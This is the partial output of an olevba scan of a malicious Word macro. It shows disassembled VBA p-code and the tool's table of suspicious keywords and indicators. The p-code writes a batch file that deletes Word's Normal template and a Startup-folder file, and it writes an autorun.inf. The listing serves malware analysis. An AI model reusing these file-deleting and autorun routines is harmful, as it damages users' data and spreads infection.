' Line #175:
' Line #176:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #177:
' 	OnError (Resume Next) 
' Line #178:
' 	Ld NormalTemplate 
' 	St n$ 
' Line #179:
' 	LitStr 0x000D "attrib -h -r "
' 	St Part11$ 
' Line #180:
' 	LitStr 0x001E "c:\progra~1\micros~1\templa~1\"
' 	St snag$ 
' Line #181:
' 	Ld u14521 
' 	Ld c17335 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x1EF0 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f6526 
' Line #182:
' 	LitStr 0x001E "c:\progra~1\micros~2\templa~1\"
' 	St snag1$ 
' Line #183:
' 	Ld u14848 
' 	Ld c11089 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x2042 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f14501 
' Line #184:
' 	LitStr 0x0004 "del "
' 	St Part2$ 
' Line #185:
' 	Ld Friend 
' 	St hFile 
' Line #186:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #187:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #188:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #189:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part11$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #190:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #191:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	Ld snag1$ 
' 	Add 
' 	Ld n$ 
' 	Add 
' 	PrintItemNL 
' Line #192:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #193:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part2$ 
' 	LitStr 0x002F "c:\windows\startm~1\programs\startup\msfile.bat"
' 	Add 
' 	PrintItemNL 
' Line #194:
' 	Ld hFile 
' 	Close 0x0001 
' Line #195:
' 	EndSub 
' Line #196:
' 	FuncDefn (Sub dhIconDisco(strFile As String))
' Line #197:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #198:
' 	OnError (Resume Next) 
' Line #199:
' 	ArgsCall Read 0x0000 
' Line #200:
' 	Ld u16742 
' 	Ld c5435 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x22DE 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f18727 
' Line #201:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St Choice 
' Line #202:
' 	Ld m12807 
' 	Ld e9975 
' 	Concat 
' 	St k8534 
' Line #203:
' 	Ld Rnd 
' 	LitDI2 0x0042 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St rnn$ 
' Line #204:
' 	Ld Rnd 
' 	LitDI2 0x001B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St rn$ 
' Line #205:
' 	Ld u6416 
' 	Ld c1682 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x008C 
' 	Mul 
' 	FnInt 
' 	Concat 
' 	St f10751 
' Line #206:
' 	LitStr 0x0009 "[autorun]"
' 	St Part1$ 
' Line #207:
' 	LitStr 0x0024 "icon = c:\windows\system\pifmgr.dll,"
' 	St Part2$ 
' Line #208:
' 	LitStr 0x0025 "icon = c:\windows\SYSTEM\shell32.dll,"
' 	St Part22$ 
' Line #209:
' 	Ld Part2$ 
' 	Ld rn$ 
' 	Add 
' 	St Part3$ 
' Line #210:
' 	Ld Part22$ 
' 	Ld rnn$ 
' 	Add 
' 	St Part33$ 
' Line #211:
' 	Ld Friend 
' 	St hFile 
' Line #212:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #213:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part1$ 
' 	PrintItemNL 
' Line #214:
' 	Ld Choice 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #215:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part3$ 
' 	PrintItemNL 
' Line #216:
' 	ElseBlock 
' Line #217:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part33$ 
' 	PrintItemNL 
' Line #218:
' 	EndIfBlock 
' Line #219:
' 	Ld hFile 
' 	Close 0x0001 
' Line #220:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AUTOEXEC            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |AUTOEXEC.BAT        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |msfile.bat          |Executable file name                         |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

